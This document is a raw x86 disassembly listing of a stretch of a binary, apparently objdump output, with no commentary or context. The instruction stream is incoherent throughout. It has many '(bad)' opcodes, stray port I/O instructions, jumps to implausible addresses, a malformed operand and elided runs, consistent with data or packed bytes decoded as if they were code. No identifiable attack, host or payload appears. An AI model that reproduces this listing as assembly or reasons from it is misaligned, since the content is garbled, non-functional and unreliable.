  4058f5:	inc    ebp
  4058f6:	(bad)  
  4058f7:	inc    esp
  4058f9:	xor    edi,edi
  4058fb:	mov    ch,0x77
  4058fd:	mov    edi,edi
  4058ff:	jmp    FWORD PTR [ebx+0x5300a040]
  405905:	(bad)  
  405906:	mov    edi,0xfe739e0f
  40590b:	call   esp
  40590d:	mov    BYTE PTR [ebp-0x76fa44],dh
  405913:	call   0xa3ad12
  405918:	cli    
  405919:	push   cs
  40591a:	dec    esi
  40591b:	mov    eax,0xe884060c
  405920:	pop    ebx
  405921:	das    
  405922:	test   bh,bh
  405924:	xor    ebp,DWORD PTR [ebx]
  405926:	idiv   edi
  405928:	dec    esi
  405929:	jecxz  0x4058c1
  40592b:	xor    DWORD PTR [esi-0x19bab498],0x6c
  405932:	add    eax,DWORD PTR [eax]
  405934:	cli    
  405935:	push   esi
  405936:	stc    
  405937:	or     esp,edx
  405939:	mov    bh,0x56
  40593b:	inc    DWORD PTR [eax]
	...
  40594d:	add    ch,cl
  40594f:	jae    0x405994
  405951:	je     0x405933
  405953:	hlt    
  405954:	enter  0xbdfb,0x41
  405958:	adc    al,0xff
  40595a:	das    
  40595b:	mov    al,0x6c
  40595d:	adc    eax,0x5083a7c8
  405962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405963:	sbb    DWORD PTR [eax-0x7c59f018],eax
  405969:	inc    DWORD PTR [ebp-0x4957fd7]
  40596f:	xchg   cl,bh
  405971:	sti    
  405972:	test   DWORD PTR [ecx+0xb],edi
  405975:	call   0xffc34f40
  40597a:	jne    0x4059f5
  40597c:	jg     0x405966
  40597e:	(bad)  
  40597f:	xor    eax,0x2a33ff83
  405984:	adc    BYTE PTR [eax],al
  405986:	(bad)  
  405987:	loop   0x4059f8
  405989:	cmp    DWORD PTR [esi],0x4dff81dc
  40598f:	push   edx
  405990:	add    ebp,DWORD PTR [edx-0x7]
  405993:	ds stc 
  405995:	pop    es
  405996:	push   edx
  405997:	ror    BYTE PTR [esi-0x1],0x35
  40599b:	in     eax,0xc8
  40599d:	sti    
  40599e:	mov    ds:0xfa04ed04,al
  4059a3:	add    al,0x6c
  4059a5:	mov    DWORD PTR ds:0xaa83167f,esp
  4059ab:	ins    BYTE PTR es:[edi],dx
  4059ac:	xor    eax,0xf204faa3
  4059b1:	inc    ebx
	...
  4059c2:	add    BYTE PTR [eax],al
  4059c4:	cmc    
  4059c5:	mov    BYTE PTR [edx+0x4],cl
  4059c8:	cli    
  4059c9:	add    al,0xb4
  4059cb:	pop    es
  4059cc:	sti    
  4059cd:	add    al,0xe9
  4059cf:	adc    dh,BYTE PTR [ebp-0x64]
  4059d2:	jmp    0x832d53da
  4059d7:	xor    edi,DWORD PTR [ebx]
  4059d9:	add    eax,0x7ecd8864
  4059de:	into   
  4059df:	sub    BYTE PTR [edx],0x6d
  4059e2:	mov    dl,BYTE PTR [ebp+eax*8+0x7d]
  4059e6:	jo     0x405970
  4059e8:	retf   0xb67e
  4059eb:	xor    BYTE PTR [ebp-0x527e4649],0x7d
  4059f2:	adc    DWORD PTR [eax],ecx
  4059f4:	sti    
  4059f5:	add    al,0xe9
  4059f7:	nop
  4059f8:	ja     0x405a6f
  4059fa:	xchg   edi,eax
  4059fb:	adc    BYTE PTR [ebp-0x1d49ff2c],0xc3
  405a02:	call   0x2874aef2
  405a07:	add    al,0x12
  405a09:	lods   eax,DWORD PTR ds:[esi]
  405a0a:	mov    ecx,0x636575c4
  405a0f:	mov    ds:0x43f204fa,al
  405a14:	out    dx,al
  405a15:	adc    edx,ebx
  405a17:	add    ebp,DWORD PTR [edi-0x79]
  405a1a:	pop    esi
  405a1b:	adc    DWORD PTR [ebp+0x7d],0xcc782b9
  405a22:	push   ecx
  405a23:	popf   
  405a24:	inc    edi
  405a25:	jge    0x405a65
  405a27:	add    BYTE PTR [eax],0x0
	...
  405a3a:	xchg   DWORD PTR [eax+eax*1+0x37],esi
  405a3e:	js     0x405abd
  405a40:	push   0x4f6e5
  405a45:	je     0x405ab9
  405a47:	jne    0x405a47
  405a49:	push   ds
  405a4a:	js     0x405a20
  405a4c:	addr16 pop ebx
  405a4e:	loope  0x405a13
  405a50:	inc    DWORD PTR [eax-0x16becbbc]
  405a56:	adc    DWORD PTR [ebp+0x6cf9a830],esp
  405a5c:	dec    edi
  405a5d:	push   esi
  405a5e:	stc    
  405a5f:	add    al,0xb
  405a61:	sub    ebp,esp
  405a63:	adc    eax,0x8274e96a
  405a68:	neg    edi
  405a6a:	jnp    0x405ae8
  405a6c:	push   eax
  405a6d:	(bad)  
  405a6e:	int    0x4
  405a70:	call   0xffbca7a3
  405a75:	(bad)  
  405a76:	lea    esi,[ebp-0x2]
  405a79:	mov    esi,0xa47d6d7b
  405a7e:	jnp    0x405afc
  405a80:	push   0x2
  405a82:	push   ds
  405a83:	inc    edx
  405a84:	shl    DWORD PTR [esi+0x15c0107b],1
  405a8a:	(bad)  
  405a8c:	mov    cl,bl
  405a8e:	mov    eax,0xac814f7c
  405a93:	push   ebp
  405a94:	inc    DWORD PTR [esi+0x18ffeeae]
  405a9a:	jnp    0x405a8e
  405a9c:	pop    es
  405a9d:	add    DWORD PTR [eax],0x0
	...
  405aaf:	add    BYTE PTR [edx+edi*2],ch
  405ab2:	jmp    FWORD PTR [esi-0x22]
  405ab5:	ror    ah,cl
  405ab7:	data16 jnp 0x405aa7
  405aba:	ja     0x405ad5
  405abc:	cmp    DWORD PTR [ecx+ebp*2-0xd],edi
  405ac0:	jp     0x405ab4
  405ac2:	pop    es
  405ac3:	inc    ecx
  405ac4:	pushf  
  405ac5:	jnp    0x405ac6
  405ac7:	add    BYTE PTR [eax+ebp*2+0x8923077],bh
  405ace:	push   0x23
  405ad0:	in     al,dx
  405ad1:	jae    0x405ada
  405ad3:	call   0x3fe1a0
  405ad8:	mov    eax,DWORD PTR [eax+0x6a13412f]
  405ade:	sbb    edi,edi
  405ae0:	jbe    0x405af2
  405ae2:	call   0xffc65873
  405ae7:	inc    DWORD PTR [esi+0xb75fefb]
  405aed:	lock fwait
  405aef:	retf   0x84ec
  405af2:	leave  
  405af3:	ret    0x7d7
  405af6:	push   ebp
  405af7:	mov    ecx,edi
  405af9:	outs   dx,DWORD PTR ds:[esi]
  405afa:	(bad)  
  405afb:	jmp    FWORD PTR [ebp+eax*2-0x7b208a01]
  405b02:	jne    0x405b0c
  405b04:	mov    ebx,0xbcffedf6
  405b09:	into   
  405b0a:	ror    DWORD PTR [eax],0xd3
  405b0d:	push   edx
  405b0e:	mov    ch,ah
  405b10:	and    ah,al
  405b12:	test   edi,0x0
	...
  405b24:	add    BYTE PTR [eax],al
  405b26:	(bad)  
  405b27:	test   BYTE PTR [eax],al
  405b29:	add    BYTE PTR [ebx+0x7f458d07],dl
  405b2f:	push   edi
  405b30:	addr16 ret 0x46b3
  405b34:	(bad)  
  405b35:	(bad)  
  405b36:	out    0x14,al
  405b38:	push   DWORD PTR ds:0x412ebc
  405b3e:	imul   edi,esp,0xffffffce
  405b41:	(bad)  
  405b42:	in     al,dx
  405b43:	or     al,al
  405b45:	je     0x405b84
  405b47:	mov    es,WORD PTR [ebp-0x8]
  405b4a:	dec    ebx
  405b4b:	push   es
  405b4c:	add    bh,ch
  405b4e:	jge    0x405ad4
  405b50:	jne    0x405b4e
  405b52:	cli    
  405b53:	shl    ch,cl
  405b55:	test   DWORD PTR [ebp+0x50],0xd3a0e80b
  405b5c:	jg     0x405b5d
  405b5e:	cmp    eax,0x77e87bb0
  405b63:	and    DWORD PTR [eax+0xb2f43ff],eax
  405b69:	add    bh,cl
  405b6b:	imul   BYTE PTR [esi-0x7f]
  405b6e:	rol    DWORD PTR ss:[eax-0x79d5ea01],1
  405b75:	mov    eax,0x800a0c
  405b7a:	cli    
  405b7b:	ins    DWORD PTR es:[edi],dx
  405b7c:	add    ecx,DWORD PTR [ebx-0x3ff39649]
  405b82:	outs   dx,BYTE PTR ds:[esi]
  405b83:	imul   eax,DWORD PTR [ebx+0x5f0fa38],0xe9
	...
  405b99:	add    BYTE PTR [eax],al
  405b9b:	add    dh,bh
  405b9d:	ins    BYTE PTR es:[edi],dx
  405b9e:	add    eax,DWORD PTR [eax]
  405ba0:	fst    st(1)
  405ba2:	adc    edi,edi
  405ba4:	dec    edi
  405ba5:	pusha  
  405ba6:	imul   ebp,DWORD PTR [ecx],0xffffffaa
  405ba9:	dec    ebx
  405baa:	jg     0x405bfc
  405bac:	sub    al,BYTE PTR [ebx-0x7]
  405baf:	pop    es
  405bb0:	rol    dl,cl
  405bb2:	jle    0x405bb3
  405bb4:	mov    ch,0x44
  405bb6:	sti    
  405bb7:	retf   
  405bb8:	lods   eax,DWORD PTR ds:[esi]
  405bb9:	stos   DWORD PTR es:[edi],eax
  405bba:	in     al,dx
  405bbb:	mov    al,ds:0xff042cd6
  405bc0:	daa    
  405bc1:	push   0x93aa0d6b
  405bc6:	jg     0x405b51
  405bc8:	ja     0x405b9e
  405bca:	jge    0x405bcb
  405bcc:	test   DWORD PTR [esi+edi*1],edx
  405bcf:	add    edx,edi
  405bd1:	imul   edx,DWORD PTR [eax+0x7ef23885],0xffffffff
  405bd8:	retf   0x8983
  405bdb:	int3   
  405bdc:	gs add eax,0x47779166
  405be2:	pop    edi
  405be3:	jg     0x405c3a
  405be5:	aad    0x55
  405be7:	mov    ecx,0x7f4e7b92
  405bec:	push   edx
  405bed:	inc    esp
  405bee:	fs add al,0xfa
  405bf1:	mov    esp,DWORD PTR [eax+eax*8+0x34]
  405bf5:	jp     0x405c2d
  405bf7:	(bad)  
  405bf8:	cld    
  405bf9:	add    BYTE PTR [esi+0x7404fa04],0x99
	...
  405c10:	add    BYTE PTR [eax],al
  405c12:	cmp    BYTE PTR [ebx+0x1e],bh
  405c15:	jg     0x405c24
  405c17:	pop    es
  405c18:	stc    
  405c19:	add    edi,edx
  405c1b:	add    al,0x95
  405c1d:	div    DWORD PTR [esi-0x70]
  405c20:	sub    edi,DWORD PTR [esi-0x3]
  405c23:	jns    0x405c91
  405c25:	ret    0xd521
  405c28:	sbb    BYTE PTR [edi+0x6be8c41e],0x82
  405c2f:	xchg   edi,eax
  405c30:	jmp    0x54854d38
  405c35:	add    ah,cl
  405c37:	fisub  WORD PTR [ebx-0x68]
  405c3a:	mov    eax,0x777ece7a
  405c3f:	(bad)  
  405c40:	adc    al,0xd4
  405c42:	push   ebp
  405c43:	fwait
  405c44:	or     eax,0x3761b5c5
  405c49:	mov    eax,ds:0x43e204fa
  405c4e:	das    
  405c4f:	pop    es
  405c50:	xchg   edx,eax
  405c51:	ret    
  405c52:	outs   dx,BYTE PTR ds:[esi]
  405c53:	(bad)  
  405c54:	stos   DWORD PTR es:[edi],eax
  405c55:	jge    0x405bec
  405c57:	jns    0x405cbd
  405c59:	shl    ecx,0x8b
  405c5c:	fs mov bh,0x84
  405c5f:	jns    0x405be7
  405c61:	jmp    0x405cb0
  405c63:	sub    al,0x28
  405c65:	add    al,0x75
  405c67:	out    dx,eax
  405c68:	jmp    esp
  405c6a:	loope  0x405c67
  405c6c:	into   
  405c6d:	outs   dx,BYTE PTR ds:[esi]
  405c6e:	in     al,0x79
  405c70:	mov    ch,0x9d
  405c72:	fistp  QWORD PTR [ecx-0x1]
  405c75:	mov    ecx,0x0
	...
  405c86:	add    BYTE PTR [eax],al
  405c88:	loope  0x405ccd
  405c8a:	iret   
  405c8b:	push   esi
  405c8c:	int3   
  405c8d:	jns    0x405d04
  405c8f:	stc    
  405c90:	sub    DWORD PTR [ecx-0x48],esp
  405c93:	ss mov esp,0xb4995079
  405c99:	out    dx,eax
  405c9a:	pop    es
  405c9b:	inc    ecx
  405c9c:	push   esi
  405c9d:	jp     0x405c9e
  405c9f:	cs xchg ecx,eax
  405ca1:	mov    dl,0xcb
  405ca3:	es pushf 
  405ca5:	xchg   DWORD PTR [ebp-0x8668d5],eax
  405cab:	mov    ecx,0xfbcaf8c
  405cb0:	test   BYTE PTR [ecx-0x18],bh
  405cb3:	aad    0x5a
  405cb5:	add    al,0x0
  405cb7:	cmp    DWORD PTR fs:[eax],ecx
  405cba:	test   DWORD PTR [ebp-0x11008794],ecx
  405cc0:	lods   eax,DWORD PTR ds:[esi]
  405cc1:	mov    ecx,0x6d5fe6fe
  405cc6:	pop    ds
  405cc7:	jl     0x405cc7
  405cc9:	add    al,0xff
  405ccb:	pushf  
  405ccc:	mov    ?,WORD PTR [edi-0x1]
  405ccf:	into   
  405cd0:	push   esi
  405cd1:	jg     0x405c9e
  405cd3:	(bad)  
  405cd4:	aas    
  405cd5:	dec    esi
  405cd6:	ret    0xf9ed
  405cd9:	ror    DWORD PTR [edx-0x3be843b],1
  405cdf:	scas   al,BYTE PTR es:[edi]
  405ce0:	lods   eax,DWORD PTR ds:[esi]
  405ce1:	or     al,0xe8
  405ce3:	stos   BYTE PTR es:[edi],al
  405ce4:	das    
  405ce5:	js     0x405ce6
  405ce7:	jo     0x405ca6
  405ce9:	jl     0x405cf6
  405ceb:	test   eax,0x0
	...
  405cfc:	add    BYTE PTR [eax],al
  405cfe:	inc    DWORD PTR [eax+0x4f9e98c]
  405d04:	push   0x41347b00
  405d09:	add    ah,dh
  405d0b:	outs   dx,DWORD PTR ds:[esi]
  405d0c:	sti    
  405d0d:	call   0x3f23fa
  405d12:	add    ebp,DWORD PTR [ecx+0x48]
  405d15:	xor    dl,BYTE PTR [edx+0x2eff5004]
  405d1b:	or     al,0xe8
  405d1d:	xchg   esp,eax
  405d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d1f:	stc    
  405d20:	(bad)  
  405d21:	call   0x3f2ac1
  405d26:	sub    eax,DWORD PTR [edi]
  405d28:	xor    al,BYTE PTR [ecx+0x23]
  405d2b:	stc    
  405d2c:	je     0x405d2a
  405d2e:	mov    ebx,0xd4ffcdda
  405d33:	push   eax
  405d34:	addr16 dec ecx
  405d36:	inc    ecx
  405d37:	inc    ebx
  405d38:	dec    DWORD PTR [edi-0xc]
  405d3b:	outs   dx,DWORD PTR ds:[esi]
  405d3c:	pop    es
  405d3d:	call   0x3f57b2
  405d42:	sti    
  405d43:	and    ebx,ecx
  405d45:	push   esp
  405d47:	push   0x3a23225
  405d4c:	push   DWORD PTR [ebp-0x19]
  405d4f:	jmp    0x405d09
  405d51:	into   
  405d52:	aam    0xf8
  405d54:	dec    edi
  405d55:	push   0x41332a
  405d5a:	adc    edi,edx
  405d5c:	je     0x405d66
  405d5e:	mov    ebx,0xfffd55
	...
  405d73:	add    BYTE PTR [ebx+ebp*8-0x74b34fb],dh
  405d7a:	addr16 inc eax
  405d7c:	mov    cl,0x42
  405d7e:	(bad)  
  405d7f:	(bad)  
  405d80:	out    dx,al
  405d81:	test   al,ch
  405d83:	cwde   
  405d84:	test   eax,edi
  405d86:	(bad)  
  405d87:	push   eax
  405d88:	or     ecx,DWORD PTR [ecx+esi*1+0x41]
  405d8c:	mov    ds:0xfa75fe53,eax
  405d91:	imul   esi,DWORD PTR gs:[ecx],0xffffff84
  405d95:	xchg   BYTE PTR [eax+ebp*8-0x69],bh
  405d99:	mov    bl,0x7c
  405d9b:	push   DWORD PTR [ebp+0x70]
  405d9e:	jg     0x405d88
  405da0:	dec    edi
  405da1:	mov    ds:0xab33ff7c,eax
  405da6:	or     eax,DWORD PTR [eax]
  405da8:	(bad)  
  405da9:	repnz outs dx,BYTE PTR ds:[esi]
  405dab:	cmp    DWORD PTR [esi],0xffffffd9
  405dae:	shr    DWORD PTR [ecx-0x6],cl
  405db1:	inc    ebx
  405db2:	pop    es
  405db3:	dec    edi
  405db5:	gs imul edi,esi,0x35
  405db9:	mov    esi,0x39bf897b
  405dbe:	mov    BYTE PTR ds:0xffc305d2,bh
  405dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc5:	add    si,WORD PTR [ecx+eiz*8-0x6b]
  405dca:	mov    ecx,0xd46dbb30
  405dcf:	out    0xc3,eax
  405dd1:	lock add al,BYTE PTR [eax]
  405dd4:	icebp  
  405dd5:	sub    eax,0x1df7
	...
  405dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405deb:	adc    eax,0x77f5d3ef
  405df0:	pop    es
  405df1:	shl    BYTE PTR [esi+0x58],0xd3
  405df5:	xor    edi,DWORD PTR [bp+si-0x3e]
  405dfa:	sub    eax,0xe207f15f
  405dff:	scas   eax,DWORD PTR es:[edi]
  405e00:	jns    0x405e01
  405e02:	int    0x44
  405e04:	(bad)
  405e08:	js     0x405e3d
  405e0a:	mov    edx,0xb5ff7b85
  405e0f:	mov    bh,0x76
  405e11:	scas   al,BYTE PTR es:[edi]
  405e12:	repnz lock les dx,DWORD PTR [eax]
  405e17:	push   edx
  405e18:	jp     0x405e8f
  405e1a:	repnz add al,0x91
  405e1d:	jne    0x405db3
  405e1f:	jbe    0x405dbf
  405e21:	out    dx,al
  405e22:	fdiv   DWORD PTR [ebp+0x1c]
  405e25:	or     al,0x92
  405e27:	pop    esi
  405e28:	(bad)  
  405e29:	jnp    0x405ea8
  405e2b:	jmp    0x405e11
  405e2d:	jp     0x405e1e
  405e2f:	or     al,0x91
  405e31:	pop    ecx
  405e32:	ins    BYTE PTR es:[edi],dx
  405e33:	jbe    0x405eab
  405e35:	out    dx,al
  405e36:	pop    ds
  405e37:	jbe    0x405e2d
  405e39:	or     edx,DWORD PTR [edx+0x52]
  405e3c:	addr16 jnp 0x405e94
  405e3f:	in     eax,dx
  405e40:	sub    al,0x34
  405e42:	mov    ebx,0xfdf15604
  405e47:	ins    BYTE PTR es:[edi],dx
  405e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e49:	js     0x405e88
  405e4b:	jbe    0x405e1e
  405e4d:	jge    0x405e4f
	...
  405e5f:	add    dl,ch
  405e61:	ret    
  405e62:	call   0x414d05e1
  405e67:	cmp    al,0x27
  405e69:	jbe    0x405e99
  405e6b:	in     al,dx
  405e6c:	int    0x33
  405e6e:	test   al,0x3
  405e70:	adc    eax,0xe16bf0f0
  405e75:	ja     0x405e8d
  405e77:	jnp    0x405e0b
  405e79:	(bad)  
  405e7a:	xlat   BYTE PTR ds:[ebx]
  405e7b:	(bad)  
  405e7c:	std    
  405e7d:	jbe    0x405efb
  405e7f:	or     esp,edx
  405e81:	push   ss
  405e82:	cld    
  405e83:	jp     0x405e72
  405e85:	in     al,dx
  405e86:	pop    esp
  405e87:	xor    eax,0xf0ee053b
  405e8c:	cmc    
  405e8d:	ins    BYTE PTR es:[edi],dx
  405e8e:	clc    
  405e8f:	js     0x405e66
  405e91:	jne    0x405ee4
  405e93:	inc    esi
  405e94:	or     eax,esp
  405e96:	call   0xc14dae15
  405e9b:	(bad)  
  405e9c:	mov    esi,0x2f7ac675
  405ea1:	jns    0x405e61
  405ea3:	lock cmc 
  405ea5:	ins    BYTE PTR es:[edi],dx
  405ea6:	add    BYTE PTR [ebx],dh
  405ea8:	cmp    DWORD PTR [esi-0x1],esi
  405eab:	push   cs
  405eac:	das    
  405ead:	inc    ebx
  405eae:	add    al,0xe9
  405eb0:	stos   BYTE PTR es:[edi],al
  405eb1:	mov    ch,ah
  405eb3:	push   0xffffff92
  405eb5:	or     DWORD PTR [eax],eax
  405eb7:	sbb    eax,0xf97575e8
  405ebc:	add    al,dh
  405ebe:	or     eax,DWORD PTR [esi-0x4c180296]
	...
  405ed4:	add    BYTE PTR [eax],al
  405ed6:	fdiv   QWORD PTR [ebp-0x1]
  405ed9:	jbe    0x405f45
  405edb:	or     eax,ebp
  405edd:	xchg   ecx,eax
  405ede:	scas   al,BYTE PTR es:[edi]
  405edf:	jne    0x405ee0
  405ee1:	xor    BYTE PTR [edi+0x7cb40008],bh
  405ee7:	push   0xeacd2d83
  405eec:	dec    DWORD PTR [ebp+0x4a]
  405eef:	adc    edi,edi
  405ef1:	mov    esp,0xed757609
  405ef6:	mov    eax,ds:0xa036cc4e
  405efb:	or     eax,eax
  405efd:	mov    ch,0x45
  405eff:	mov    WORD PTR [ebp+0x25],es
  405f02:	and    DWORD PTR [ebx+0x75f9a832],edi
  405f08:	jne    0x405f1f
  405f0a:	xchg   ecx,eax
  405f0b:	retf   
  405f0c:	int3   
  405f0d:	push   cs
  405f0e:	sub    ah,0xff
  405f11:	call   0xfe911276
  405f16:	fisttp QWORD PTR [eax+ebp*8]
  405f19:	dec    esp
  405f1a:	pusha  
  405f1b:	je     0x405f1c
  405f1d:	cmp    DWORD PTR [edx],0x52e94137
  405f23:	cli    
  405f24:	sti    
  405f25:	shl    DWORD PTR [eax],1
  405f27:	inc    edx
  405f28:	call   esi
  405f2a:	(bad)  
  405f2b:	add    eax,0xd580be00
  405f30:	inc    BYTE PTR [eax]
  405f32:	test   BYTE PTR [eax],0xe8
  405f35:	mov    ch,BYTE PTR [esi+ebp*8-0x2]
  405f39:	push   0x0
	...
  405f4a:	add    BYTE PTR [eax],al
  405f4c:	cmp    DWORD PTR [ebx],0x41
  405f4f:	add    BYTE PTR [esp+eiz*2-0x5],cl
  405f53:	call   0x3f2ae8
  405f58:	jmp    0x405f64
  405f5a:	add    bh,ch
  405f5c:	sub    eax,0x9b75fe59
  405f61:	loopne 0x405fd1
  405f63:	(bad)  
  405f64:	jl     0x405f54
  405f66:	(bad)  
  405f67:	jne    0x405f58
  405f69:	loopne 0x405fc8
  405f6b:	leave  
  405f6c:	in     al,dx
  405f6d:	in     eax,dx
  405f6e:	enter  0x43c2,0x8
  405f72:	push   ebp
  405f73:	mov    ebp,DWORD PTR [edi-0x5dcd23a0]
  405f79:	or     bh,bh
  405f7b:	jne    0x405fdc
  405f7d:	loopne 0x405f67
  405f7f:	int3   
  405f80:	lods   al,BYTE PTR ds:[esi]
  405f81:	in     eax,dx
  405f82:	(bad)  
  405f83:	jne    0x405fd8
  405f85:	pop    eax
  405f86:	out    0x34,eax
  405f88:	fsubp  st(5),st
  405f8a:	(bad)  
  405f8b:	jmp    DWORD PTR [esi+0x4]
  405f8e:	push   eax
  405f8f:	jmp    DWORD PTR [esi+0x0]
  405f92:	call   0xff2e3bd5
  405f97:	push   0x413aea
  405f9c:	in     al,dx
  405f9d:	arpl   WORD PTR [ebx],cx
  405f9f:	call   0x3f1c78
  405fa4:	cld    
  405fa5:	arpl   WORD PTR [edi],cx
  405fa7:	push   eax
  405fa8:	or     ebx,DWORD PTR [ebx]
  405faa:	int    0xff
  405fac:	in     al,dx
  405fad:	in     al,dx
  405fae:	je     0x405fc4
	...
  405fc0:	add    BYTE PTR [eax],al
  405fc2:	sub    esp,0x74
  405fc5:	or     BYTE PTR [ebx-0x530000e5],ch
  405fcb:	mov    esi,0x5dfa10c1
  405fd0:	into   
  405fd1:	mov    cl,dh
  405fd3:	fidivr WORD PTR [esi]
  405fd5:	cld    
  405fd6:	mov    ch,0x30
  405fd8:	or     al,ch
  405fda:	dec    edx
  405fdb:	mov    eax,ds:0x9df1ff78
  405fe0:	out    dx,eax
  405fe1:	dec    ecx
  405fe2:	jae    0x40600c
  405fe4:	js     0x40604e
  405fe6:	cli    
  405fe7:	pop    ebp
  405fe8:	push   0x34e822be
  405fed:	inc    ecx
  405fee:	cli    
  405fef:	call   0xe80c:0x187dfbee
  405ff6:	or     DWORD PTR [edx+0x5ce2ff78],0x5a4ef03
  406000:	aas    
  406001:	xor    bh,BYTE PTR [ebx+0x5675785d]
  406007:	jmp    0xff78:0x5b6207ed
  40600e:	inc    ebp
  40600f:	inc    ebp
  406010:	add    eax,0xeb834d00
  406015:	iret   
  406016:	call   0xa83f63b7
  40601b:	xor    DWORD PTR [eax+0x75],edi
  40601e:	repnz vpaddd xmm3,xmm3,XMMWORD PTR ds:0x757822
	...
  406037:	add    BYTE PTR [esi],dl
  406039:	adc    eax,0x120dc8b4
  40603e:	dec    edx
  40603f:	ret    0x5df2
  406042:	into   
  406043:	mov    cl,BYTE PTR [esi]
  406045:	fidivr WORD PTR [esi]
  406047:	cld    
  406048:	pusha  
  406049:	pop    esp
  40604a:	in     eax,dx
  40604b:	add    al,0xed
  40604d:	stc    
  40604e:	or     ch,al
  406050:	iret   
  406051:	and    DWORD PTR [eax-0x1],edi
  406054:	jae    0x405fff
  406056:	ja     0x4060c0
  406058:	add    DWORD PTR ds:0xeacdc51b,0x53b3237
  406062:	(bad)  
  406063:	xor    ebp,edi
  406065:	sbb    ebp,DWORD PTR [eax]
  406067:	add    al,0xb5
  406069:	clc    
  40606a:	lock imul ebx,DWORD PTR [ebx+esi*2-0x42],0x77
  406070:	adc    dl,BYTE PTR [eax-0x15623b05]
  406076:	inc    ebx
  406077:	xor    bh,BYTE PTR [ebx]
  406079:	add    eax,0x1bcd31a6
  40607e:	sub    BYTE PTR [eax*4+0x646be0f8],al
  406085:	jae    0x406015
  406087:	ja     0x40606b
  406089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40608a:	mov    ebx,0x17ea6dc4
  40608f:	xor    bh,BYTE PTR [ebx+0x1d317604]
  406095:	sbb    al,0x28
  406097:	add    al,0x55
  406099:	clc    
  40609a:	lock imul eax,DWORD PTR [eax],0x0
	...
  4060ae:	int3   
  4060af:	jb     0x40610f
  4060b1:	ja     0x406085
  4060b3:	mov    eax,ds:0xea3dc51b
  4060b8:	mov    bh,0x31
  4060ba:	mov    ebx,0xed314604
  4060bf:	sbb    ebp,DWORD PTR [eax-0x1f07dafd]
  4060c5:	imul   edx,DWORD PTR [edx+esi*2+0x7da2772e],0xffffffdb
  4060cd:	les    ecx,FWORD PTR ds:0xbb3195ea
  4060d3:	add    al,0x16
  4060d5:	xor    DWORD PTR [ebp-0xafc57e5],edi
  4060db:	div    eax
  4060dd:	imul   edi,DWORD PTR [ebx+esi*2],0xfffffffe
  4060e1:	jbe    0x406135
  4060e3:	nop
  4060e4:	add    BYTE PTR [ebx+0x766771b6],bh
  4060ea:	or     eax,esp
  4060ec:	jmp    ebp
  4060ee:	or     dh,BYTE PTR [edx]
  4060f0:	sub    DWORD PTR [eax],ebp
  4060f2:	(bad)  
  4060f3:	jno    0x40616a
  4060f5:	loope  0x406148
  4060f7:	cmp    edi,esi
  4060f9:	into   
  4060fa:	sub    al,0xdd
  4060fc:	mov    eax,ds:0x6771b6fb
  406101:	ss call 0xeaf660ca
  406107:	xor    DWORD PTR [ecx],ebp
  406109:	sub    dh,bh
  40610b:	jno    0x406182
  40610d:	icebp  
  40610e:	and    DWORD PTR [ebx],edx
  406110:	(bad)  
  406111:	sahf   
	...
  406122:	add    BYTE PTR [eax],al
  406124:	or     al,0xdd
  406126:	scas   al,BYTE PTR es:[edi]
  406127:	(bad)  [esi+0x28166771]
  40612d:	(bad)  
  40612e:	inc    DWORD PTR [ebp+0x2829322a]
  406134:	(bad)  
  406135:	jno    0x4061ac
  406137:	loope  0x40610a
  406139:	or     bh,dh
  40613b:	outs   dx,BYTE PTR ds:[esi]
  40613c:	int3   
  40613d:	fmul   QWORD PTR [edx+0x6771371b]
  406143:	mov    eax,0xc0ffc40b
  406148:	sti    
  406149:	add    al,0x0
  40614b:	imul   ebp,DWORD PTR [edi+esi*8+0x6f945107],0x90113eff
  406156:	xor    ch,BYTE PTR [eax-0x49b2307]
  40615c:	ds jno 0x4061c6
  40615f:	jmp    0x40615a
  406161:	add    al,0x80
  406163:	push   ds
  406164:	or     cl,BYTE PTR [ecx]
  406166:	call   0xffb1e39c
  40616b:	sbb    DWORD PTR [ebx-0x1cffbecd],0x9232505c
  406175:	add    al,0x68
  406177:	add    dl,bl
  406179:	add    al,0x80
  40617b:	dec    DWORD PTR [esi-0x4]
  40617e:	out    0xc1,eax
  406180:	(bad)  
  406181:	cli    
  406182:	(bad)  
  406183:	push   0x413374
	...
  406198:	add    BYTE PTR [eax],al
  40619a:	cmp    edx,DWORD PTR [ecx+esi*1+0x41]
  40619e:	mov    ds:0xa300015c,eax
  4061a3:	test   bh,bh
  4061a5:	jne    0x406152
  4061a7:	fsubr  QWORD PTR [ecx+0x67fa64fd]
  4061ad:	mov    edx,DWORD PTR [ecx-0x139800bd]
  4061b3:	xor    al,BYTE PTR [ecx+0x0]
  4061b6:	jmp    0x4061ba
  4061b8:	add    BYTE PTR [eax],al
  4061ba:	adc    edi,edx
  4061bc:	je     0x4061c6
  4061be:	jnp    0x406156
  4061c0:	std    
  4061c1:	push   DWORD PTR [ecx+eiz*2-0x64]
  4061c5:	xor    dl,BYTE PTR [edx]
  4061c7:	or     DWORD PTR [eax+0x77],ebp
  4061ca:	mov    eax,ds:0x6167ff43
  4061cf:	add    al,0x0
  4061d1:	adc    ah,0x5f
  4061d4:	pop    es
  4061d5:	call   0x3f5901
  4061da:	cmp    esp,DWORD PTR [esi+0x5c234132]
  4061e0:	jbe    0x406214
  4061e2:	bound  eax,QWORD PTR [eax+ebp*2]
  4061e5:	add    dl,BYTE PTR [ebx]
  4061e7:	add    al,0x80
  4061e9:	call   FWORD PTR [esi-0x4]
  4061ec:	out    0x65,eax
  4061ee:	out    0xf9,al
  4061f0:	(bad)  
  4061f1:	push   0x4132a4
  4061f6:	imul   esp,DWORD PTR [ecx+0x31],0x41
  4061fa:	cli    
  4061fb:	pop    ebp
  4061fc:	jmp    0x4061ff
	...
  40620e:	add    BYTE PTR [eax],al
  406210:	cli    
  406211:	pop    ebp
  406212:	cmp    edi,0x67
  406215:	jbe    0x406282
  406217:	dec    esi
  406218:	out    0x6e,eax
  40621a:	je     0x406286
  40621c:	add    BYTE PTR [edi-0x12],dh
  40621f:	pop    es
  406220:	loop   0x406286
  406222:	jne    0x406223
  406224:	int    0xd3
  406226:	and    bh,bh
  406228:	dec    edi
  406229:	jbe    0x406296
  40622b:	(bad)  
  40622c:	mov    edi,0x166a7456
  406231:	aas    
  406232:	out    dx,al
